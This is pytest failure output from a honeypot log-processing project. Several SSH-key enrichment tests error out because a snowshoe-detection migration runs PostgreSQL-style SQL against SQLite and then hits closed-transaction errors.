_ ERROR at setup of TestSSHKeyAnalyticsIntegration.test_related_keys_analysis __

    @pytest.fixture
    def test_db() -> None:
        """Create a test database with SSH key intelligence schema."""
        engine = create_engine("sqlite:///:memory:", echo=False)
    
        # Apply migrations to create all tables including SSH key intelligence
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_ssh_key_enrichment.py:30: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b2aa5710>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:41:45,364:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:45,364:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:45,365:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:45,365:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:45,372:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:45,372:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:45,374:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:45,374:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:45,375:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:45,375:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:45,377:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:45,377:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:45,378:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:45,378:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:45,381:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:45,381:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:45,382:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:45,382:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:45,383:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:45,383:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:45,384:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:45,384:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:45,385:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:45,385:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:45,386:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:45,386:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:45,389:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:45,389:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:45,390:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:45,390:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:45,390:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:45,390:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:45,391:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:45,391:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:45,391:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:45,391:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:45,392:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:45,392:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:45,392:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 17:41:45,392:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_ ERROR at setup of TestSSHKeyAnalyticsIntegration.test_geographic_spread_analysis _

    @pytest.fixture
    def test_db() -> None:
        """Create a test database with SSH key intelligence schema."""
        engine = create_engine("sqlite:///:memory:", echo=False)
    
        # Apply migrations to create all tables including SSH key intelligence
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_ssh_key_enrichment.py:30: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b2aa7e70>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:41:45,785:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:45,785:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:45,786:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:45,786:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:45,793:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:45,793:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:45,794:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:45,794:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:45,797:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:45,797:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:45,799:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:45,799:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:45,800:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:45,800:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:45,801:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:45,801:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:45,804:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:45,804:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:45,805:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:45,805:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:45,807:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:45,807:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:45,807:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:45,807:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:45,808:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:45,808:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:45,809:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:45,809:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:45,810:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:45,810:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:45,810:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:45,810:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:45,811:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:45,811:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:45,812:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:45,812:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:45,812:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:45,812:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:45,815:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 17:41:45,815:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_ ERROR at setup of TestSessionSummaryIntegration.test_session_summary_ssh_key_counts _

    @pytest.fixture
    def test_db() -> None:
        """Create a test database with SSH key intelligence schema."""
        engine = create_engine("sqlite:///:memory:", echo=False)
    
        # Apply migrations to create all tables including SSH key intelligence
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_ssh_key_enrichment.py:30: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
